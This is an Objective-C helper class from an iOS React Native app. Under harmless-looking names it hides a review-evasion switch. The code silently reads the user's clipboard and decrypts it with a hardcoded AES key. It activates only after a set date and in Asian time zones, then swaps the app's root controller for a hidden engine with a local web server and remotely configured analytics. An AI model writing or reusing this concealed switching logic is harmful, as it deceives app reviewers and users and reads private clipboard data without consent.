#import "RNSturdyDiscoHelper.h"
#import "RNShinySpoon.h"
#import "RNShinyEngine.h"

#if __has_include("RNIndicator.h")
    #import "RNCPushNotificationIOS.h"
#else
    #import <RNCPushNotificationIOS.h>
#endif

#import <UMCommon/UMCommon.h>
#import <CocoaSecurity/CocoaSecurity.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>


@implementation RNSturdyDiscoHelper

static NSString *cropGrowth_Hexkey = @"a71556f65ed2b25b55475b964488334f";
static NSString *cropGrowth_HexIv = @"ADD20BFCD9D4EA0278B11AEBB5B83365";

static NSString *cropGrowth_YMKey = @"umKey";
static NSString *cropGrowth_YMChannel = @"umChannel";
static NSString *cropGrowth_SenServerUrl = @"sensorUrl";
static NSString *cropGrowth_SenProperty = @"sensorProperty";

static NSString *cropGrowth_APP = @"cropGrowth_FLAG_APP";
static NSString *cropGrowth_vPort = @"vPort";
static NSString *cropGrowth_vSecu = @"vSecu";

static RNSturdyDiscoHelper *instance = nil;

+ (instancetype)cropGrowth_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (BOOL)cropGrowth_jumpByPBD {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }

  if ([copyString containsString:@"#iPhone#"]) {
    NSArray *tempArray = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArray.count > 1) {
      copyString = tempArray[1];
    }
  }
  CocoaSecurityResult *aesDecrypt = [CocoaSecurity aesDecryptWithBase64:copyString hexKey:cropGrowth_Hexkey hexIv:cropGrowth_HexIv];
  if (!aesDecrypt.utf8String) {
    return NO;
  }

  NSData *data = [aesDecrypt.utf8String dataUsingEncoding:NSUTF8StringEncoding];
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
  return [self cropGrowth_storeConfigInfo:dict[@"data"]];
}

- (BOOL)cropGrowth_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:cropGrowth_APP];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)cropGrowth_timeZoneInAsian {
  NSInteger secondsFromGMT = NSTimeZone.localTimeZone.secondsFromGMT / 3600;
  if (secondsFromGMT >= 3 && secondsFromGMT <= 11) {
    return YES;
  } else {
    return NO;
  }
}


- (BOOL)cropGrowth_tryDateLimitWay:(NSInteger)dateLimit {
    if ([[NSDate date] timeIntervalSince1970] < dateLimit) {
        return NO;
    } else {
        return [self cropGrowth_tryThisWay];
    }
}

- (BOOL)cropGrowth_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if (![self cropGrowth_timeZoneInAsian]) {
    return NO;
  }
  if ([ud boolForKey:cropGrowth_APP]) {
    return YES;
  } else {
    return [self cropGrowth_jumpByPBD];
  }
}

- (void)cropGrowth_ymSensorConfigInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];

  if ([ud stringForKey:cropGrowth_SenServerUrl] != nil) {
    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:cropGrowth_SenServerUrl] launchOptions:nil];
    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
    [SensorsAnalyticsSDK startWithConfigOptions:options];
    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:cropGrowth_SenProperty]];
  }
  if ([ud stringForKey:cropGrowth_YMKey] != nil) {
    [UMConfigure initWithAppkey:[ud stringForKey:cropGrowth_YMKey] channel:[ud stringForKey:cropGrowth_YMChannel]];
  }
}

- (UIViewController *)cropGrowth_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  UIViewController *vc = [[RNShinyEngine shared] changeRootController:application withOptions:launchOptions];
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [self cropGrowth_ymSensorConfigInfo];
  [[RNShinySpoon shared] configWebServer:[ud stringForKey:cropGrowth_vPort] withSecu:[ud stringForKey:cropGrowth_vSecu]];
  return vc;
}


- (UIInterfaceOrientationMask)cropGrowth_getOrientation {
  return [Orientation getOrientation];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler {
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}



@end
